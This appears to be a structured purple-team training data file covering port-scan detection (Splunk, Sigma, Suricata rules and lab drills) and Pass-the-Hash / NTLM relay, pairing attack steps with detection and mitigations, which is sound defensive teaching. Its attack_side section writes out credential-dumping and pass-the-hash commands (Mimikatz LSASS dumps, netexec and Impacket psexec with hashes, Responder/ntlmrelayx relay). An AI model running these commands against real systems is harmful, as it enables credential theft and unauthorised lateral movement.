Splunk: index=firewall | stats dc(dest_port) by src_ip | where dc(dest_port) > 50 — port scan pattern
Sigma: win_multiple_failed_logons — Event 4625 count > threshold in time window
Suricata: ET scan rules for nmap/masscan signatures
controls: Windows logon failure monitoring (Account Lockout Policy)

topics.gap_analysis: Slow scanning (one port per minute) evades rate-based detection. Legitimate vulnerability scanners create noise that masks malicious scanning. Gap: many orgs dont deploy Zeek internally (only at perimeter) missing internal lateral scanning. Must baseline legitimate scanner activity to filter it.
drills: Run nmap scan on a lab network. Verify Zeek/RITA detects the scanning pattern. Then run a slow scan (1 port/minute) — does your detection still catch it? Set up a filter to exclude known scanner IPs.
common_mistakes: Not deploying network monitoring internally (only at internet edge)
Not baselining legitimate scanner activity (Nessus SCCM)
Setting port-scan thresholds too high (missing slow scans) or too low (too noisy)

topics.title: Pass-the-Hash (T1550.002) vs. NTLM Monitoring & Relay Protections
concepts: Pass-the-Hash (PtH): authenticate using an NTLM hash without knowing the plaintext password
PtH uses NTLM authentication — any system accepting NTLM auth is vulnerable
Detection: NTLM network logons (Event 4624 Logon Type 3) with unusual patterns — source timing accounts
NTLM relay: attacker intercepts authentication and relays it to another system (Responder ntlmrelayx)
NTLM relay protections: SMB signing LDAP channel binding EPA (Extended Protection for Authentication)
key_facts: Event 4624 Logon Type 3 (Network) with Authentication Package = NTLM indicates NTLM network logon
Event 4624 with LogonProcessName = NtLmSsp confirms NTLM (not Kerberos) authentication
SMB Signing (required on all systems) prevents NTLM relay to SMB
LDAP Channel Binding + LDAP Signing prevents NTLM relay to LDAP/AD

attack_side.technique: Use stolen NTLM hashes to authenticate to remote systems without knowing the plaintext password
attack_steps: Obtain NTLM hashes from LSASS dump (Mimikatz) NTDS.dit or SAM extraction
Pass-the-Hash: netexec smb target -u Administrator -H NTLM_hash
PtH with Impacket: psexec.py -hashes :NTLM_hash user@target
Alternative: NTLM relay — capture authentication (Responder) and relay to another target (ntlmrelayx)
Gain code execution on target system via SMB/WMI/WinRM with relayed or passed hash

defense_side.what_to_detect: Detect NTLM authentication from unexpected sources to unexpected destinations or NTLM relay patterns
